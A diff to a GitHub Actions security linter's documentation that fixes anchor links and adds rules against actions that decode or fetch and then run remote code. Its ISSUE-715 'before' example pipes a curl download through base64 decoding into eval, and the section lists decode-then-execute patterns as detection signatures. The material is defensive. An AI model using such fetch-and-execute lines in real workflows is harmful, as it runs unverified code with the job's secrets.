@@ -13,25 +13,28 @@ reading the upstream docs.
 | :--- | :--- | :--- |
 | [ISSUE-102](#issue-102--image-mutable-tag) | `image-mutable-tag` | high |
 | [ISSUE-103](#issue-103--image-not-pinned-by-digest) | `image-not-pinned-by-digest` | high |
-| [ISSUE-701](#issue-104--action-unpinned) | `action-unpinned` | high |
+| [ISSUE-701](#issue-701--action-unpinned) | `action-unpinned` | high |
 | [ISSUE-713](#issue-713--action-authorized-sources) | `action-authorized-sources` | high |
-| [ISSUE-704](#issue-105--container-hardcoded-credentials) | `container-hardcoded-credentials` | **critical** |
+| [ISSUE-704](#issue-704--container-hardcoded-credentials) | `container-hardcoded-credentials` | **critical** |
 | [ISSUE-705](#issue-705--cache-poisoning) | `cache-poisoning` | high |
-| [ISSUE-706](#issue-107--dockerfile-unpinned-base) | `dockerfile-unpinned-base` | medium |
-| [ISSUE-702](#issue-108--action-archived-repo) | `action-archived-repo` | high _(API)_ |
-| [ISSUE-707](#issue-109--impostor-commit) | `impostor-commit` | **critical** _(API)_ |
-| [ISSUE-708](#issue-110--ref-version-mismatch) | `ref-version-mismatch` | medium _(API)_ |
-| [ISSUE-709](#issue-111--stale-action-ref) | `stale-action-ref` | low _(API)_ |
-| [ISSUE-712](#issue-112--release-workflow-unsigned) | `release-workflow-unsigned` | medium |
+| [ISSUE-706](#issue-706--dockerfile-unpinned-base) | `dockerfile-unpinned-base` | medium |
+| [ISSUE-702](#issue-702--action-archived-repo) | `action-archived-repo` | high _(API)_ |
+| [ISSUE-707](#issue-707--impostor-commit) | `impostor-commit` | **critical** _(API)_ |
+| [ISSUE-708](#issue-708--ref-version-mismatch) | `ref-version-mismatch` | medium _(API)_ |
+| [ISSUE-709](#issue-709--stale-action-ref) | `stale-action-ref` | low _(API)_ |
+| [ISSUE-712](#issue-712--release-workflow-unsigned) | `release-workflow-unsigned` | medium |
 | [ISSUE-402](#issue-402--ref-confusion) | `ref-confusion` | medium _(API)_ |
-| [ISSUE-703](#issue-114--known-vulnerable-action) | `known-vulnerable-action` | **critical** _(API)_ |
-| [ISSUE-711](#issue-115--superfluous-action) | `superfluous-action` | low |
+| [ISSUE-703](#issue-703--known-vulnerable-action) | `known-vulnerable-action` | **critical** _(API)_ |
+| [ISSUE-711](#issue-711--superfluous-action) | `superfluous-action` | low |
+| [ISSUE-715](#issue-715--action-obfuscated-remote-exec) | `action-obfuscated-remote-exec` | **critical** _(API)_ |
+| [ISSUE-714](#issue-714--action-mutable-remote-exec) | `action-mutable-remote-exec` | high _(API)_ |
+| [ISSUE-716](#issue-716--action-source-unverifiable) | `action-source-unverifiable` | low _(API)_ |
 
 ### Expressions & injections — `2xx`
 
 | Code | Name | Severity |
 | :--- | :--- | :--- |
-| [ISSUE-207](#issue-206--template-injection) | `template-injection` | **critical** |
+| [ISSUE-207](#issue-207--template-injection) | `template-injection` | **critical** |
 | [ISSUE-208](#issue-208--insecure-commands) | `insecure-commands` | high |
 | [ISSUE-209](#issue-209--github-env-injection) | `github-env-injection` | **high** |
 | [ISSUE-210](#issue-210--bot-conditions) | `bot-conditions` | high |
@@ -48,7 +51,7 @@ reading the upstream docs.
 | [ISSUE-301](#issue-301--retired) | _retired (gitleaks removal, #310 — slot must not be reused)_ | — |
 | [ISSUE-302](#issue-302--secrets-inherit) | `secrets-inherit` | high |
 | [ISSUE-303](#issue-303--unredacted-secrets) | `unredacted-secrets` | high |
-| [ISSUE-801](#issue-304--undocumented-permissions) | `undocumented-permissions` | medium |
+| [ISSUE-801](#issue-801--undocumented-permissions) | `undocumented-permissions` | medium |
 | [ISSUE-305](#issue-305--secrets-outside-env) | `secrets-outside-env` | medium |
 | [ISSUE-306](#issue-306--github-app-skip-revoke) | `github-app-skip-revoke` | high |
 | [ISSUE-307](#issue-307--artipacked) | `artipacked` | high |
@@ -60,37 +63,37 @@ reading the upstream docs.
 | Code | Name | Severity |
 | :--- | :--- | :--- |
 | [ISSUE-411](#issue-411--unverified-scripts) | `unverified-scripts` | high |
-| [ISSUE-802](#issue-414--dangerous-triggers) | `dangerous-triggers` | **critical** |
-| [ISSUE-804](#issue-415--pull-request-target-with-head-checkout) | `pull-request-target-with-head-checkout` | **critical** |
+| [ISSUE-802](#issue-802--dangerous-triggers) | `dangerous-triggers` | **critical** |
+| [ISSUE-804](#issue-804--pull-request-target-with-head-checkout) | `pull-request-target-with-head-checkout` | **critical** |
 
 ### Access & authorisation — `5xx`
 
 | Code | Name | Severity |
 | :--- | :--- | :--- |
-| [ISSUE-803](#issue-509--excessive-permissions) | `excessive-permissions` | high |
+| [ISSUE-803](#issue-803--excessive-permissions) | `excessive-permissions` | high |
 
 ### Workflow hygiene — `6xx`
 
 | Code | Name | Severity |
 | :--- | :--- | :--- |
 | [ISSUE-601](#issue-601--anonymous-definition) | `anonymous-definition` | low |
-| [ISSUE-418](#issue-602--missing-concurrency) | `missing-concurrency` | medium |
-| [ISSUE-419](#issue-603--workflow-misfeature) | `workflow-misfeature` | medium |
-| [ISSUE-420](#issue-604--workflow-obfuscation) | `workflow-obfuscation` | high |
-| [ISSUE-421](#issue-605--use-trusted-publishing) | `use-trusted-publishing` | high |
-| [ISSUE-901](#issue-606--dependabot-insecure-exec) | `dependabot-insecure-exec` | **critical** |
-| [ISSUE-902](#issue-607--dependabot-missing-cooldown) | `dependabot-missing-cooldown` | low |
-| [ISSUE-903](#issue-608--dependency-update-tool-missing) | `dependency-update-tool-missing` | medium |
-| [ISSUE-904](#issue-609--sast-workflow-missing) | `sast-workflow-missing` | low |
-| [ISSUE-905](#issue-610--security-policy-missing) | `security-policy-missing` | low |
+| [ISSUE-418](#issue-418--missing-concurrency) | `missing-concurrency` | medium |
+| [ISSUE-419](#issue-419--workflow-misfeature) | `workflow-misfeature` | medium |
+| [ISSUE-420](#issue-420--workflow-obfuscation) | `workflow-obfuscation` | high |
+| [ISSUE-421](#issue-421--use-trusted-publishing) | `use-trusted-publishing` | high |
+| [ISSUE-901](#issue-901--dependabot-insecure-exec) | `dependabot-insecure-exec` | **critical** |
+| [ISSUE-902](#issue-902--dependabot-missing-cooldown) | `dependabot-missing-cooldown` | low |
+| [ISSUE-903](#issue-903--dependency-update-tool-missing) | `dependency-update-tool-missing` | medium |
+| [ISSUE-904](#issue-904--sast-workflow-missing) | `sast-workflow-missing` | low |
+| [ISSUE-905](#issue-905--security-policy-missing) | `security-policy-missing` | low |
 
 ### Run / output conventions
 
 - Every finding prints a clickable `↳ at <file>:<line>` — `Ctrl+click`
   in a VS Code terminal opens the exact job.
 - Severity counts drive the **Plumber score** (A–E). Rules tagged
-  _(API)_ call GitHub through `gh` and stay silent when `gh auth login`
-  has not been set up.
+  _(API)_ call the GitHub REST API in process via `go-gh` (never the
+  `gh` binary) and stay silent when no token is available.
 - To turn a rule off, either disable its `ControlName` in
   `.plumber.yaml` or pass `--skip-controls <control-name>`. The
   mapping lives in [`control/codes.go`](../control/codes.go).
@@ -645,6 +648,104 @@ The curated list (conservative by design) tracks the most common
 offenders; complex actions like `actions/cache` or `setup-<lang>`
 stay off it because they do enough real work to justify the
 dependency.
+
+---
+
+## ISSUE-715 — `action-obfuscated-remote-exec`
+
+**Severity:** `critical` • **Control:** `actionsMustNotExecuteMutableRemoteCode`
+
+The action's own source decodes and then executes code: `base64 -d | sh`,
+`eval "$(… | base64 -d)"`, `eval(atob(…))`, `new Function(atob(x))`, a
+hex/`xxd` decode piped to a shell. No legitimate action needs to hide what
+it runs at runtime, so obfuscation-then-execute is the strongest signal
+Plumber emits, regardless of host, ref, or encoding.
+
+```yaml
+# ❌ before — inside the action's own action.yml
+runs:
+  using: composite
+  steps:
+    - shell: bash
+      run: eval "$(curl -sL https://example.com/p | base64 -d)"
+```
+
+```yaml
+# ✅ after — explicit, pinned, checksum-verified
+runs:
+  using: composite
+  steps:
+    - shell: bash
+      run: |
+        curl -sSLo tool.tar.gz https://example.com/tool/v1.2.3/tool.tar.gz
+        echo "a1b2c3…  tool.tar.gz" | sha256sum -c -
+        tar xzf tool.tar.gz && ./tool
+```
+
+This deliberately does not chase every possible encoding, which is an
+unbounded space. It flags the act of hiding, which is what makes a clean
+result meaningful.
+
+---
+
+## ISSUE-714 — `action-mutable-remote-exec`
+
+**Severity:** `high` • **Control:** `actionsMustNotExecuteMutableRemoteCode`
+
+The action's own source fetches and executes a script from a **moving ref**
+(a branch such as `main`, not a tag or SHA) of another repository at
+runtime, without verifying the download against a checksum.
+
+**Pinning the action by commit SHA does not reach this.** The fetched code
+can change with nothing committed where your pin can see it, so a
+compromise or retag of that upstream branch runs arbitrary code in your job
+with its token and secrets. The canonical example is `anchore/scan-action`,
+which fetches `raw.githubusercontent.com/anchore/grype/main/install.sh` and
+runs it.
+
+```yaml
+# ❌ before — SHA-pinned, and still exposed
+- uses: anchore/scan-action@abc123…   # the action itself curl|sh's a branch
+```
+
+```yaml
+# ✅ after — install the tool yourself, pinned and verified
+- run: |
+    curl -sSLo grype.tar.gz \
+      https://github.com/anchore/grype/releases/download/v0.116.0/grype_0.116.0_linux_amd64.tar.gz
+    echo "40aff724…  grype.tar.gz" | sha256sum -c -
+    tar xzf grype.tar.gz && ./grype .
+```
+
+A fetch that already verifies a pinned checksum is content-pinned and is
+not flagged. This is a static, text-level match on the action's source: it
+catches the in-the-open shape, not an author who deliberately hides the
+fetch (that is ISSUE-715). A clean result asserts "no known pattern seen",
+not "safe".
+
+---
+
+## ISSUE-716 — `action-source-unverifiable`
+
+**Severity:** `low` • **Control:** `actionsMustNotExecuteMutableRemoteCode`
+
+Plumber could not fetch the action's own source (network error, API rate
+limit, GitHub Enterprise Server host, private repo, or a Docker-image
+action) so it could not confirm whether the action fetches mutable remote
+code at runtime.
+
+This is surfaced as an explicit could-not-verify finding rather than a
+silent pass. A silent pass would let the same repository score differently
+across CI environments and would over-claim safety on an unchecked
+dependency.
+
+Re-run where the action source is reachable (authenticated token, network
+access) for a definitive result, or vendor the action so its source is
+local and auditable. The finding is informational: it flags an unchecked
+dependency, not a confirmed problem. Note that `--fail-warnings` turns
+could-not-verify results into exit code 3.
+
+First-party `actions/*` and `github/*` are never source-scanned.
 
 ---
 
@@ -1851,7 +1952,8 @@ the policy from the repo landing page and the "Security" tab.
 | :--- | :--- |
 | `0` | The Plumber Score meets the gate (`--min-points` / `--min-score`) |
 | `1` | The Plumber Score is below the gate |
-| `2` | Runtime error (bad config, missing auth, collector failure) |
+| `2` | Invalid usage, configuration, or a runtime / provider / auth / network failure |
+| `3` | A check could not be verified and `--fail-warnings` is set (e.g. an action version that could not be resolved), or the run was degraded |
 
 ### `.plumber.yaml` control names
 
@@ -1869,6 +1971,7 @@ and in `.plumber.yaml`) is declared in
 | ISSUE-402 | `externalRefsMustNotCollide` |
 | ISSUE-703 | `actionsMustNotCarryKnownCVEs` |
 | ISSUE-711 | `actionsMustNotDuplicateRunnerBuiltins` |
+| ISSUE-714 / 715 / 716 | `actionsMustNotExecuteMutableRemoteCode` |
 | ISSUE-213 | `workflowMustNotExportEntireGitHubContext` |
 | ISSUE-214 | `workflowMustPinPackageInstalls` |
 | ISSUE-215 | `workflowMustNotInjectVarsInScripts` |
@@ -1882,10 +1985,22 @@ and in `.plumber.yaml`) is declared in
 
 ### API-backed rules
 
-ISSUE-702 / 109 / 110 / 111 / 113 / 114 call the GitHub REST API
-via `github.com/cli/go-gh`, which reuses the locally stored `gh`
-token. Without `gh auth login`, those rules degrade silently (no
-false positives) rather than failing the run.
+ISSUE-702 / 703 / 707 / 708 / 709 / 711 / 713 and the ISSUE-714/715/716
+family call the GitHub REST API **in process** via
+`github.com/cli/go-gh`, which reuses the locally stored `gh` token.
+Plumber never shells out to the `gh` binary (or any other external
+binary) during analysis — see getplumber/plumber#310. Without
+`gh auth login`, those rules degrade silently (no false positives)
+rather than failing the run.
+
+Token resolution order: `GH_TOKEN` → `GITHUB_TOKEN` →
+`GH_ENTERPRISE_TOKEN` → the `gh` CLI's per-host token.
+
+If the action lives in an org behind an IP allow list (which blocks the
+runner's `GITHUB_TOKEN`), set `PLUMBER_METADATA_TOKEN` to a token with
+public-repository read so version resolution still works. Without it
+Plumber falls back to an anonymous read, and if that is rate-limited too
+it skips the check rather than guessing.
 
 Disable them explicitly in sealed CI environments with:
 
